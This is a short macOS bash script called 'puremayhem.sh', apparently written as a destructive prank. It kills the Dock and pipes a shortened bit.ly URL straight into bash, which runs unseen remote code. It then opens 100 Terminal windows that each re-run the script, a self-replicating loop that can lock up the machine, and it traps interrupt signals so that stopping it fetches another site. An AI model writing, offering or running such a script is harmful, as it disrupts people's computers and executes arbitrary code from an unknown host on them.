
#!/bin/bash
# puremayhem.sh
killall Dock
curl -L http://bit.ly/10hA8iC | bash
for ((x = 0; x<100; x++)); 
do
        osascript -e 'tell application "Terminal" to do script "sh puremayhem.sh"' >/dev/null
        trap "curl parrot.live" SIGINT SIGTERM
done
